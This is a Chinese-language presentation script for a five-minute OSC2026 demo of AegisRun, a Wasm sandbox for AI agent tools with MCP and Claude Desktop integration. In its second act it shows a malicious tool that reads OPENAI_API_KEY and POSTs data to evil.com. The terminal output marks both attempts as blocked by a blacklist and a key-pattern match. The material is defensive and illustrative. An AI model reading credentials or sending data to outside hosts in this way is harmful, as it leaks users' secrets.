# OSC2026 演示方案：AegisRun 三幕演示

> 总时长：~5 分钟 | 目标：展示"工具开发→安全拦截→Agent集成"完整链路

---

## 🎬 演示叙事

### 第一幕：工具开发（90秒）— "写一个 AI Agent 工具很简单"

**画面**：VSCode 中打开 MoonBit 工具代码

```
解说词：
"AI Agent 需要调用各种工具——天气查询、数据库操作、文件处理。
传统方式下，这些 Python/JS 工具直接持有 API Key 和系统权限。

在 AegisRun 中，我们用 MoonBit 写工具，编译为 Wasm 模块。
重点是这一行——Capability 声明：工具必须明确列出它需要什么权限。
网络只允许 wttr.in 域名，超时 5 秒，不碰文件系统，不读环境变量。"
```

**操作**：
```cmd
:: 展示工具源码
type demo\showcase\chorus_tool.mbt

:: 编译工具（展示编译速度和产物大小）
moon build --target wasm
dir /s target\wasm\*chorus*.wasm
```

**关键镜头**：
- Tool trait 实现代码特写
- `required_capabilities()` 返回的权限列表
- Wasm 产物大小（<1KB）

---

### 第二幕：安全拦截（120秒）— "但即使工具藏了恶意代码..."

**画面**：运行 AegisRun 拦截演示，终端实时输出

```
解说词：
"但真正的风险来自于——你从社区安装的第三方工具，里面可能藏着恶意代码。
看这个'天气助手'工具，表面功能是查天气，但它偷偷做了两件事：
1. 读取 OPENAI_API_KEY 环境变量
2. 把数据 POST 到 evil.com

在传统 Agent 框架里，这段代码会直接执行成功——你的密钥就泄露了。

但在 AegisRun 里——"
```

**操作**：
```cmd
:: 运行拦截演示（全部 14 种攻击）
set AEGISRUN_ATTACKS=all
moon run src/demo/intercept.mbt
```

**关键镜头**（终端实时输出）：
```
-- Attack 7: OpenAI API key theft --
  Tool attempts: getenv(OPENAI_API_KEY)
  [BLOCKED] API_KEY pattern matched — credential protected

-- Attack 1: evil.com exfiltration --
  Tool attempts: POST https://evil.com/collect?data=x
  [BLOCKED] evil.com in blacklist — HTTP request never sent

============================================================
  Interception Results
  Caught: 14  |  Missed: 0
  VERDICT: All malicious behaviors intercepted by AegisRun
============================================================
```

```
解说词：
"14 种攻击，14 次拦截，0 次漏过。
关键不是黑名单——而是默认拒绝原则：任何未在 Capability 中声明的操作，
Wasm 沙箱层面就不会给它执行机会。"
```

---

### 第三幕：Agent 集成（90秒）— "最后，接到真实 Agent"

**画面**：Dashboard + MCP 配置 + Claude Desktop 调用

```
解说词：
"AegisRun 通过 MCP 协议直接对接 Claude Desktop。
只需在配置文件中加 3 行，Agent 就能发现并安全调用你的工具。

打开 Dashboard，可以看到每一次工具调用的审计日志——
哪个 Agent 调了什么工具、输入输出、是否被拦截、耗时多少。
"
```

**操作**：
```cmd
:: 1. 先展示 MCP Server 启动
start "AegisRun MCP Server" moon run src/main/mcp_server.mbt

:: 2. 打开 Dashboard
start "" "dashboard.html"

:: 3. 展示 Claude Desktop 配置
type "%APPDATA%\Claude\claude_desktop_config.json"
```

**关键镜头**：
- Dashboard 中实时显示策略状态（14 拦截/0 放行）
- MCP 工具列表：`aegisrun.sandbox`、`aegisrun.scan`、`aegisrun.policy.*`
- 在 Claude Desktop 中对话："请帮我查一下北京天气" → Agent 调用 AegisRun 工具 → 沙箱安全执行 → 返回结果

---

## 📋 演示检查清单

| # | 项目 | 状态 |
|---|------|------|
| 1 | MoonBit 工具链可用 (`moon version`) | □ |
| 2 | 拦截演示跑通 (14/14) | □ |
| 3 | MCP Server 可启动 | □ |
| 4 | Dashboard 可打开 | □ |
| 5 | Claude Desktop 配置就绪 | □ |
| 6 | 录屏软件（OBS/Bandicam）就绪 | □ |
| 7 | 终端字体足够大（演示用） | □ |

---

## 🎥 录制建议

- **终端**：使用 Windows Terminal，字体调大（16pt+），深色主题
- **分屏**：左半 VSCode（代码），右半终端（执行结果）
- **剪辑点**：编译等待的 0.5 秒可以剪掉，但 Wasm 产物体积特写不能剪
- **配乐**：第一幕轻快科技感，第二幕紧张悬疑，第三幕大气收尾
- **字幕**：关键术语加字幕（Capability、Wasm Sandbox、MCP Protocol）
